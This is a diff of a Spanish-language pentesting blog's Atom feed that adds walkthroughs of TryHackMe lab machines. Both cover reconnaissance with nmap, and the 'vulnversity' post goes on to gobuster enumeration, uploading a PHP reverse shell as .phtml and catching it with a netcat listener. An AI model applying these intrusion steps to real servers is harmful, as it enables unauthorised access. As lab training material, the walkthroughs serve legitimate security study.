@@ -1,4 +1,338 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2021-11-10T00:56:43-05:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Pentester - Ctf’s</title><subtitle>Ingeniero de sistemas, autodidacta, entusidasta por la seguridad informatica.</subtitle><author><name>Deiby Espinosa</name><email>deibysp39@gmail.com</email></author><entry><title type="html">Hackthebox: Secret</title><link href="http://localhost:4000/Secret/" rel="alternate" type="text/html" title="Hackthebox: Secret" /><published>2021-11-09T00:00:00-05:00</published><updated>2021-11-09T00:00:00-05:00</updated><id>http://localhost:4000/Secret</id><content type="html" xml:base="http://localhost:4000/Secret/">&lt;h2 id=&quot;iniciamos-comprobando-que-la-maquina-este-activa-antes-que-nada&quot;&gt;Iniciamos comprobando que la maquina este activa antes que nada&lt;/h2&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2021-11-12T08:43:10-05:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Pentester - Ctf’s</title><subtitle>Ingeniero de sistemas, autodidacta, entusidasta por la seguridad informatica.</subtitle><author><name>Deiby Espinosa</name><email>deibysp39@gmail.com</email></author><entry><title type="html">Walking An Application</title><link href="http://localhost:4000/Walking-An-Application/" rel="alternate" type="text/html" title="Walking An Application" /><published>2021-11-12T00:00:00-05:00</published><updated>2021-11-12T00:00:00-05:00</updated><id>http://localhost:4000/Walking-An-Application</id><content type="html" xml:base="http://localhost:4000/Walking-An-Application/"></content><author><name>Deiby Espinosa</name><email>deibysp39@gmail.com</email></author><summary type="html"></summary></entry><entry><title type="html">tryhackme: blue</title><link href="http://localhost:4000/blue/" rel="alternate" type="text/html" title="tryhackme: blue" /><published>2021-11-11T00:00:00-05:00</published><updated>2021-11-11T00:00:00-05:00</updated><id>http://localhost:4000/blue</id><content type="html" xml:base="http://localhost:4000/blue/">&lt;h3 id=&quot;iniciamos-conprobando-que-la-maquina-este-encendida&quot;&gt;Iniciamos conprobando que la maquina este encendida&lt;/h3&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ ping &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; 1 10.10.31.159
+PING 10.10.31.159 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.10.31.159&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 56&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;84&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; bytes of data.
+64 bytes from 10.10.31.159: &lt;span class=&quot;nv&quot;&gt;icmp_seq&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1 &lt;span class=&quot;nv&quot;&gt;ttl&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;127 &lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;187 ms
+
+&lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt; 10.10.31.159 ping statistics &lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt;
+1 packets transmitted, 1 received, 0% packet loss, &lt;span class=&quot;nb&quot;&gt;time &lt;/span&gt;0ms
+rtt min/avg/max/mdev &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 186.669/186.669/186.669/0.000 ms
+❯ settarget 10.10.31.159
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Comprobamos que &lt;em&gt;OS&lt;/em&gt; corre la maquina&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ wichSystem.py 10.10.31.159
+
+10.10.31.159 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ttl -&amp;gt; 127&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: Windows
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;ahora-si-a-realizar-un-primer-escaneo-de-puertos&quot;&gt;ahora si a realizar un primer escaneo de puertos&lt;/h3&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;--open&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--min-rate&lt;/span&gt; 5000 &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sS&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; 10.10.31.159 &lt;span class=&quot;nt&quot;&gt;-oG&lt;/span&gt; allPorts
+Starting Nmap 7.92 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2021-11-11 07:47 &lt;span class=&quot;nt&quot;&gt;-05&lt;/span&gt;
+Stats: 0:00:43 elapsed&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; 0 hosts completed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, 1 undergoing SYN Stealth Scan
+SYN Stealth Scan Timing: About 54.84% &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ETC: 07:48 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0:00:36 remaining&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Stats: 0:01:25 elapsed&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; 0 hosts completed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, 1 undergoing SYN Stealth Scan
+SYN Stealth Scan Timing: About 99.99% &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ETC: 07:48 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0:00:00 remaining&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.31.159
+Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1.2s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+Not shown: 52538 filtered tcp ports &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;no-response&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, 12992 closed tcp ports &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;reset&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Some closed ports may be reported as filtered due to &lt;span class=&quot;nt&quot;&gt;--defeat-rst-ratelimit&lt;/span&gt;
+PORT      STATE SERVICE
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+445/tcp   open  microsoft-ds
+3389/tcp  open  ms-wbt-server
+49153/tcp open  unknown
+
+Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;85.45 seconds
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;How many ports are open with a port number under 1000?
+3&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;vemos el resultado del escaneo anterior con la utilidad &lt;em&gt;extractPors&lt;/em&gt; y esta nos copia los puertos en la clipboard&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; extractPorts allPorts
+   1   │ 
+   2   │ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Extracting information...
+   3   │ 
+   4   │     &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; IP Address: 10.10.31.159
+   5   │     &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Open ports: 135,139,445,3389,49153
+   6   │ 
+   7   │ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Ports copied to clipboard
+   8   │ 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Con los puertos copiados en la clipboard procedemos a realizar un escaneo con &lt;em&gt;script&lt;/em&gt; basicos de vulnerabildades de &lt;em&gt;nmap&lt;/em&gt;&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;What is this machine vulnerable to? (Answer in the form of: ms??-???, ex: ms08-067)&lt;/p&gt;
+
+&lt;/blockquote&gt;</content><author><name>Deiby Espinosa</name><email>deibysp39@gmail.com</email></author><category term="tryhackme" /><category term="Ethernal blue - ms08-067" /><category term="Windows" /><summary type="html">El mejor metodo de aprendizaje es practicando</summary></entry><entry><title type="html">tryhackme: vulnversity</title><link href="http://localhost:4000/vulnversity/" rel="alternate" type="text/html" title="tryhackme: vulnversity" /><published>2021-11-10T00:00:00-05:00</published><updated>2021-11-10T00:00:00-05:00</updated><id>http://localhost:4000/vulnversity</id><content type="html" xml:base="http://localhost:4000/vulnversity/">&lt;h3 id=&quot;iniciamos-la-fase-de-reconocimiento&quot;&gt;Iniciamos la fase de reconocimiento&lt;/h3&gt;
+
+&lt;p&gt;Antes de iniciar, verificamos que la maquina este activa&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ ping &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; 1 10.10.249.39
+PING 10.10.249.39 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.10.249.39&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 56&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;84&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; bytes of data.
+64 bytes from 10.10.249.39: &lt;span class=&quot;nv&quot;&gt;icmp_seq&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1 &lt;span class=&quot;nv&quot;&gt;ttl&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;63 &lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1085 ms
+
+&lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt; 10.10.249.39 ping statistics &lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt;
+1 packets transmitted, 1 received, 0% packet loss, &lt;span class=&quot;nb&quot;&gt;time &lt;/span&gt;0ms
+rtt min/avg/max/mdev &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 1085.220/1085.220/1085.220/0.000 ms
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Enviamos un ping y recivimos una respuesta, esta activa la maquinal&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Comprovamos que &lt;em&gt;OS&lt;/em&gt; tiene la maquia antes de iniciar&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ wichSystem.py 10.10.249.39
+
+10.10.249.39 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ttl -&amp;gt; 63&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: Linux
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;reconnaissance&quot;&gt;Reconnaissance&lt;/h3&gt;
+
+&lt;p&gt;Iniciamos haciendo un primer escaneo con &lt;em&gt;nmap&lt;/em&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;--open&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--min-rate&lt;/span&gt; 5000 &lt;span class=&quot;nt&quot;&gt;-sS&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; 10.10.249.39 &lt;span class=&quot;nt&quot;&gt;-oG&lt;/span&gt; allPorts
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Scan the box, how many ports are open?
+6&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Vemos que tiene 6 puertos abiertos, ahora a ver que servicios estan corriendo en cada uno&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; extractPorts allPorts
+   1   │ 
+   2   │ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Extracting information...
+   3   │ 
+   4   │     &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; IP Address: 10.10.249.39
+   5   │     &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Open ports: 21,22,139,445,3128,3333
+   6   │ 
+   7   │ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Ports copied to clipboard
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;What version of the squid proxy is running on the machine?
+3128/tcp open  http-proxy  Squid http proxy 3.5.12&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ nmap &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sC&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p21&lt;/span&gt;,22,139,445,3128,3333 10.10.249.39 &lt;span class=&quot;nt&quot;&gt;-oN&lt;/span&gt; targeted
+Starting Nmap 7.92 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2021-11-10 01:29 &lt;span class=&quot;nt&quot;&gt;-05&lt;/span&gt;
+Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.249.39
+Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.17s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+
+PORT     STATE SERVICE     VERSION
+21/tcp   open  ftp         vsftpd 3.0.3
+22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+| ssh-hostkey: 
+|   2048 5a:4f:fc:b8:c8:76:1c:b5:85:1c:ac:b2:86:41:1c:5a &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|   256 ac:9d:ec:44:61:0c:28:85:00:88:e9:68:e9:d0:cb:3d &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ECDSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|_  256 30:50:cb:70:5a:86:57:22:cb:52:d9:36:34:dc:a5:58 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ED25519&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;workgroup: WORKGROUP&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;workgroup: WORKGROUP&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+3128/tcp open  http-proxy  Squid http proxy 3.5.12
+|_http-server-header: squid/3.5.12
+|_http-title: ERROR: The requested URL could not be retrieved
+3333/tcp open  http        Apache httpd 2.4.18 &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
+|_http-server-header: Apache/2.4.18 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|_http-title: Vuln University
+Service Info: Host: VULNUNIVERSITY&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; OSs: Unix, Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+| smb-os-discovery: 
+|   OS: Windows 6.1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Samba 4.3.11-Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|   Computer name: vulnuniversity
+|   NetBIOS computer name: VULNUNIVERSITY&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;00
+|   Domain name: &lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;00
+|   FQDN: vulnuniversity
+|_  System &lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt;: 2021-11-10T01:30:09-05:00
+|_clock-skew: mean: 1h39m59s, deviation: 2h53m12s, median: &lt;span class=&quot;nt&quot;&gt;-1s&lt;/span&gt;
+| smb2-security-mode: 
+|   3.1.1: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   &lt;span class=&quot;nb&quot;&gt;date&lt;/span&gt;: 2021-11-10T06:30:09
+|_  start_date: N/A
+|_nbstat: NetBIOS name: VULNUNIVERSITY, NetBIOS user: &amp;lt;unknown&amp;gt;, NetBIOS MAC: &amp;lt;unknown&amp;gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;unknown&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;dangerous, but default&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;30.84 seconds
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;(Vamos respondiendo las preguntas de la maquina)&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;How many ports will nmap scan if the flag -p-400 was used?
+400&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Using the nmap flag -n what will it not resolve?
+DNS&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;What is the most likely operating system this machine is running?
+Ubuntu&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;What port is the web server running on?
+3333&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h3 id=&quot;locating-directories-using-gobuster&quot;&gt;Locating directories using GoBuster&lt;/h3&gt;
+
+&lt;p&gt;En esta fase utilizaremos Gobuster para ver posibles &lt;em&gt;urls&lt;/em&gt; existentes&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;What is the directory that has an upload form page?
+ /internal/&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; gobuster &lt;span class=&quot;nb&quot;&gt;dir&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; http://10.10.1.188:3333 &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /usr/share/wordlists/dirb/common.txt &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; gobuster.txt
+
+&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
+2021/11/10 09:37:40 Starting gobuster &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;directory enumeration mode
+&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
+/.hta                 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 403&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Size: 292]
+/.htpasswd            &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 403&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Size: 297]
+/.htaccess            &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 403&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Size: 297]
+/css                  &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 301&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Size: 315] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; http://10.10.1.188:3333/css/]
+/fonts                &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 301&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Size: 317] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; http://10.10.1.188:3333/fonts/]
+/images               &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 301&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Size: 318] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; http://10.10.1.188:3333/images/]
+/index.html           &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 200&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Size: 33014]                                    
+/internal             &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 301&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Size: 320] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; http://10.10.1.188:3333/internal/]
+/js                   &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 301&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Size: 314] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; http://10.10.1.188:3333/js/]      
+/server-status        &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 403&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Size: 301]                                        
+                                                                                       
+&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
+2021/11/10 09:39:13 Finished
+&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;entramos en la ruta que encontramos con el anterior escaneo &lt;em&gt;http://10.10.1.188:3333/internal/&lt;/em&gt; y encontramos que podemos subir
+un archivo en la maquina, probaremos obtener una &lt;em&gt;shell&lt;/em&gt; mediante php&lt;/p&gt;
+
+&lt;p&gt;para ello, modificaremos &lt;a href=&quot;https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php&quot;&gt;esta&lt;/a&gt; &lt;em&gt;shell&lt;/em&gt; de php&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;/assets/images/vulnversity/server.png&quot;&gt;cargar shell&lt;/a&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;compromise-the-webserver&quot;&gt;Compromise the webserver&lt;/h3&gt;
+
+&lt;p&gt;En esta parte podemos hacerlo de varios metodos, pero seguiremos la maquina y utilizaremos &lt;em&gt;burp suite&lt;/em&gt;&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Run this attack, what extension is allowed?
+.phtml&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;&lt;a href=&quot;/assets/images/vulnversity/shell.png&quot;&gt;shell en el servidor&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;ponemos nuestra maquina en escucha&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ nc &lt;span class=&quot;nt&quot;&gt;-nlvp&lt;/span&gt; 1234
+listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 1234 ...
+connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.9.0.237] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.1.188] 57880
+Linux vulnuniversity 4.4.0-142-generic &lt;span class=&quot;c&quot;&gt;#168-Ubuntu SMP Wed Jan 16 21:00:45 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux&lt;/span&gt;
+ 09:55:03 up 39 min,  0 &lt;span class=&quot;nb&quot;&gt;users&lt;/span&gt;,  load average: 0.00, 0.00, 0.03
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
